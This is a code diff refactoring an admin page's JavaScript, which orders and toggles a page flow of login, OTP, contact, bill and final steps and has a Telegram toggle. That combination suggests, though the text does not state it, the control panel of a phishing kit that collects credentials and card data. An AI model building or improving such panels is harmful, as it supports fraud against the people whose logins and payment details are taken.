@@ -84,8 +84,10 @@
 <script>
 const REQUIRED_PAGES = ["login", "final"];
 
-let pageFlowConfig = {}; // step => { page, enabled }
-let pageOrder = [];
+let pageFlowConfig = {}; // step -> { page, enabled }
+let pageOrder = [];     // ordered array of page names
+let pageStepMap = {};   // page -> step
+
 let confirmedAdminPassword = null;
 
 /* ===============================
@@ -97,6 +99,9 @@ async function getSettings() {
   return res.json();
 }
 
+/* ===============================
+   LOAD SETTINGS
+================================ */
 async function loadSettings() {
   try {
     const data = await getSettings();
@@ -108,25 +113,65 @@ async function loadSettings() {
 
     document.getElementById("telegramToggle").checked = !!data.TelegramEnabled;
     document.getElementById("baSubToggle").checked = !!data.baSub;
+
+    let rawFlow = data.pageFlow;
+
+	if (typeof rawFlow === "string") {
+	  try {
+	    rawFlow = JSON.parse(rawFlow);
+	  } catch (e) {
+	    console.error("Invalid pageFlow JSON from backend:", rawFlow);
+	    rawFlow = null;
+	  }
+	}
+	
+	if (!rawFlow || typeof rawFlow !== "object") {
+	  rawFlow = {
+	    "1": { page: "login", enabled: true },
+	    "2": { page: "otp", enabled: true },
+	    "3": { page: "contact", enabled: true },
+	    "4": { page: "bill", enabled: true },
+	    "5": { page: "final", enabled: true }
+	  };
+	}
+	    
+	console.log(typeof rawFlow );
+	console.log(rawFlow);
+
+    pageFlowConfig = {};
+    pageOrder = [];
+    pageStepMap = {};
     
-    console.log(data.pageFlow); 
+    console.log("flow config", pageFlowConfig);
+    console.log("flow order", pageOrder);
+    console.log("flow config", pageStepMap);
 
-    // Normalize backend pageFlow
-    pageFlowConfig = data.pageFlow || {
-      "1": { page: "login", enabled: true },
-      "2": { page: "otp", enabled: true },
-      "3": { page: "contact", enabled: true },
-      "4": { page: "bill", enabled: true },
-      "5": { page: "final", enabled: true }
-    };
+    Object.keys(rawFlow)
+		  .sort((a, b) => Number(a) - Number(b))
+		  .forEach(step => {
+		    const val = rawFlow[step];
+		
+		    // HARD FAIL if malformed (helps debugging)
+		    if (!val || typeof val !== "object") return;
 
-    pageOrder = Object.keys(pageFlowConfig)
-      .sort((a, b) => Number(a) - Number(b))
-      .map(k => pageFlowConfig[k].page);
+				const pageName = val.page || val.name;
+				if (!pageName) return;
+		
+		    pageFlowConfig[step] = {
+		      page: pageName,
+		      enabled: REQUIRED_PAGES.includes(pageName) ? true : !!val.enabled
+		    };
+		
+		    pageOrder.push(pageName);
+		    pageStepMap[pageName] = step; 
+		  });
+      
+      console.log("page order", pageOrder);
+      
 
     renderPageList();
-  } catch (e) {
-    console.error("Failed to load settings", e);
+  } catch (err) {
+    console.error("Failed to load settings", err);
   }
 }
 
@@ -135,13 +180,24 @@ async function loadSettings() {
 ================================ */
 function renderPageList() {
   const list = document.getElementById("pageList");
+
+  if (!list) {
+    console.error("❌ #pageList element not found");
+    return;
+  }
+  
+console.log("page order", pageOrder);
+
   list.innerHTML = "";
 
+  if (!pageOrder.length) {
+    list.innerHTML = "<li>No pages configured</li>";
+    return;
+  }
+
   pageOrder.forEach(page => {
-  console.log(pageOrder);
-  console.log("page:", page);
-    const stepKey = Object.keys(pageFlowConfig)
-      .find(k => pageFlowConfig[k].page === page);
+    const stepKey = pageStepMap[page];
+    if (!stepKey) return;
 
     const step = pageFlowConfig[stepKey];
     const isRequired = REQUIRED_PAGES.includes(page);
@@ -149,19 +205,31 @@ function renderPageList() {
     const li = document.createElement("li");
     li.dataset.page = page;
     li.draggable = !isRequired;
-    if (isRequired) li.classList.add("disabled");
+    li.className = isRequired ? "disabled" : "";
 
-    li.innerHTML = `
-      <span>${page}${isRequired ? " (required)" : ""}</span>
-      <label class="switch">
-        <input type="checkbox"
-               data-page="${page}"
-               ${step.enabled ? "checked" : ""}
-               ${isRequired ? "disabled" : ""}>
-        <span class="slider"></span>
-      </label>
-    `;
+    const label = document.createElement("span");
+    label.textContent = page + (isRequired ? " (required)" : "");
 
+    const toggle = document.createElement("input");
+    toggle.type = "checkbox";
+    toggle.checked = !!step.enabled;
+    toggle.disabled = isRequired;
+    toggle.dataset.page = page;
+
+    toggle.onchange = () => {
+      pageFlowConfig[stepKey].enabled = true;
+      if (!isRequired) {
+        pageFlowConfig[stepKey].enabled = toggle.checked;
+      }
+    };
+
+    const switchWrap = document.createElement("label");
+    switchWrap.className = "switch";
+    switchWrap.appendChild(toggle);
+    switchWrap.appendChild(document.createElement("span")).className = "slider";
+
+    li.appendChild(label);
+    li.appendChild(switchWrap);
     list.appendChild(li);
   });
 
@@ -178,9 +246,8 @@ function bindEvents() {
   list.querySelectorAll("input[type=checkbox]").forEach(cb => {
     cb.onchange = e => {
       const page = e.target.dataset.page;
-
-      const stepKey = Object.keys(pageFlowConfig)
-        .find(k => pageFlowConfig[k].page === page);
+      const stepKey = pageStepMap[page];
+      if (!stepKey) return;
 
       if (REQUIRED_PAGES.includes(page)) {
         e.target.checked = true;
@@ -227,15 +294,16 @@ function buildPageFlow() {
   const flow = {};
   let step = 1;
 
-  for (const page of pageOrder) {
-    const key = Object.keys(pageFlowConfig)
-      .find(k => pageFlowConfig[k].page === page);
+  pageOrder.forEach(page => {
+    const stepKey = pageStepMap[page];
+    if (!stepKey) return;
 
     flow[step++] = {
       page,
-      enabled: pageFlowConfig[key].enabled
+      enabled: pageFlowConfig[stepKey].enabled
     };
-  }
+  });
+
   return flow;
 }
 
